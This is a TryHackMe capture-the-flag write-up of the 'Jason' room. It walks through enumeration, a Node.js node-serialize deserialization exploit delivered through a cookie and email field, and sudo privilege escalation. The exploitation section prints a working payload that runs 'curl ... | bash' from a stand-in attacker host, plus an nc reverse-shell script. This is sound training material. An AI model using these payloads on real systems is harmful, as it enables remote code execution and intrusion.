---
title: "Jax sucks alot............."
platform: "TryHackMe"
difficulty: "Easy"
date: "2026-03-22"
tags: ["linux", "nodejs", "cve"]
excerpt: "In JavaScript everything is a terrible mistake."
icon: "https://tryhackme-images.s3.amazonaws.com/room-icons/0d7a5f0c5e85265e1f0624cac523fb6c.png"
roomUrl: "https://tryhackme.com/room/jason"
---

## 🔍 Initial Access

Before interacting with any target, it's important to understand what is exposed.  
Jumping straight into exploitation without enumeration is how things get missed.

---

## 🔎 Service Enumeration

```bash
nmap -sC -sS -sV -Pn -T4 <TARGET_IP>
```

![Nmap Scan Screenshot](/assets/writeups/thm-rooms/jason/nmap.png)

### 📊 Why this matters

- `-sC` runs default scripts → quick vulnerability hints  
- `-sV` detects service versions → useful for known exploits  
- `-Pn` skips host discovery → avoids ICMP restrictions  

### 📌 Findings

- **Port 22 (SSH)** → likely not exploitable without creds  
- **Port 80 (HTTP)** → primary attack surface  

👉 Decision: focus on the web application.

---

## 🌐 Web Enumeration

We open our browser and navigate to the target:

```http
http://<TARGET_IP>
```

![Website Screenshot](/assets/writeups/thm-rooms/jason/website.png)

The application looks simple — just a form.  
But simple apps often hide logic in the backend.

---

## 🔎 Source Code Inspection

![Source Code Screenshot](/assets/writeups/thm-rooms/jason/source.png)

The source code mostly contains **CSS styling**, which isn’t useful for exploitation.
However, there is a **script reference**, which is more important.

### 📌 Why check source?

- Developers sometimes leave hidden endpoints or comments  
- Framework hints can guide exploitation  

### 🔑 Key discovery

The app is built with **Node.js**

👉 This tells us:
- Data is likely handled as JSON  
- JavaScript-based vulnerabilities are in play  

---

## 🔍 Vulnerability Scanning

### 🛠️ Nikto

Before going deeper manually, I wanted to quickly check for any **common web vulnerabilities or misconfigurations**.

Since the site looked simple and didn’t reveal much at first glance, using Nikto was a fast way to make sure I wasn’t missing anything obvious.

```bash
nikto -h http://<TARGET_IP>
```

![Nikto Screenshot](/assets/writeups/thm-rooms/jason/nikto.png)

**Why run Nikto?**

- Quickly checks for known web misconfigurations  
- Saves time before manual testing  

➡️ Result: nothing useful

---

### 📂 Gobuster

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster Screenshot](/assets/writeups/thm-rooms/jason/gobuster.png)

**Why?**

- Hidden directories often expose admin panels or APIs  

➡️ Result: nothing found

👉 At this point, we shift strategy: analyze behavior instead of structure.

---

## 🧪 Traffic Analysis

We submit an email and observe what happens.

![Burp Request & Response Screenshot](/assets/writeups/thm-rooms/jason/burpsuite.png)

### 📌 Why this step is critical

Web apps often reveal more in **how they respond** than in what they show.

---

## 🔍 Cookie Analysis

We extract the session cookie:

```bash
echo "eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==" | base64 -d
```

![Decode Screenshot](/assets/writeups/thm-rooms/jason/decode.png)

### Output:

```json
{"email":"test@test.com"}
```

---

## ⚠️ Understanding the Vulnerability

This is where everything changes.

### ❌ Bad Practice

- The server stores **user-controlled data in the cookie**
- Only encoded (Base64), not protected

### ⚡ Why this is dangerous

- Base64 is reversible → NOT encryption  
- We can modify the data freely  
- The server trusts it blindly  

👉 This opens the door to **tampering and injection**

---

## 🧠 Exploitation Strategy

Because:

- Backend = Node.js  
- Data format = JSON  
- User-controlled data in cookies = potential deserialization vulnerability

When Node.js applications use unsafe deserialization libraries (like node-serialize), they can inadvertently execute code embedded in serialized objects. The ```_$$ND_FUNC$$_``` prefix is a known gadget that triggers function execution during deserialization.

---

## 💥 Crafting the Payload

I searched online for Node.js deserialization payloads and found this article:  
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

### The Attack Chain
Rather than executing a reverse shell directly, I used a two-stage approach:  
1. Make the target download a shell script  
2. Execute it with bash  

This avoids potential issues with special characters and provides more reliability.

### Stage 1: The Malicious Cookie
I encoded this payload to replace the original cookie:

```json
{"email":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl http://<ATTACKER_IP>:8000/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

Breaking it down:
- ```_$$ND_FUNC$$_``` - The magic prefix that triggers function evaluation
- ```require('child_process')``` - Loads Node.js command execution module
- ```.exec()``` - Executes our curl + bash pipeline
- The function wrapper ensures immediate execution when deserialized


### Stage 2: Reverse Shell Script
On my attacker machine, I created shell.sh with a standard reverse shell payload:
```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

### Stage 3: Delivery Infrastructure
```bash
# Terminal 1 - Host the shell script
python3 -m http.server 8000

# Terminal 2 - Listen for the reverse shell
nc -lvnp 4444
```

### Stage 4: Triggering the Exploit

Instead of modifying the cookie directly, I simply submitted the payload into the email address input field on the website:

![Payload Submission Screenshot](/assets/writeups/thm-rooms/jason/payload_submission.png)
**The payload entered:**
```text
_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl http://<ATTACKER_IP>:8000/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) });\n }()
```

When the server processed this form submission, it serialized the email input into the cookie. However, during the deserialization process on subsequent requests, the embedded function was executed, which downloaded and ran our reverse shell script.

**Why this works:**
1. The application takes our email input and stores it in a cookie after Base64 encoding
2. The payload contains the ```_$$ND_FUNC$$_``` magic prefix
3. When the server reads the cookie and deserializes it, Node.js executes the embedded function
4. This triggers our curl command to download and execute the reverse shell script
5. We get a callback to our netcat listener

This approach is even simpler than modifying the cookie directly, as the vulnerable deserialization occurs automatically when the server processes the stored session data.


## 🔓 Shell Access

![Shell Screenshot](/assets/writeups/thm-rooms/jason/shell.png)

Success! We now have a reverse shell as the ubuntu user.

---

## 🏁 User Flag

![User Flag Screenshot](/assets/writeups/thm-rooms/jason/user_flag.png)

---

## 📈 Privilege Escalation

With a foothold established, I started looking for privilege escalation vectors:

```bash
sudo -l
```

![Sudo Screenshot](/assets/writeups/thm-rooms/jason/sudo.png)

### Output Analysis:

This is a critical misconfiguration:

- ```(ALL : ALL) ALL``` - Can run any command as any user
- ```(ALL) NOPASSWD: ALL``` - No password required for ANY command

This essentially means the ubuntu user has unrestricted root access without authentication.

---

## 👑 Root Access

```bash
sudo cat /root/root.txt
```

![Root Flag Screenshot](/assets/writeups/thm-rooms/jason/root_flag.png)

No further exploitation needed - the system was already configured to give away root access.

<img src="https://media1.tenor.com/m/AXPrLtVZ_1wAAAAd/nice-yess.gif" width="400" className="mx-auto rounded-lg shadow-lg my-6">

---

## 📌 Conclusion

### 🔑 What this machine teaches

- Encoding is NOT security  
- Never trust client-side data  
- Node.js deserialization is dangerous  
- Small mistakes → full compromise  
- Misconfigured sudo = instant root  

---

This machine is a perfect reminder:

> The easiest systems to break are the ones that trust the user.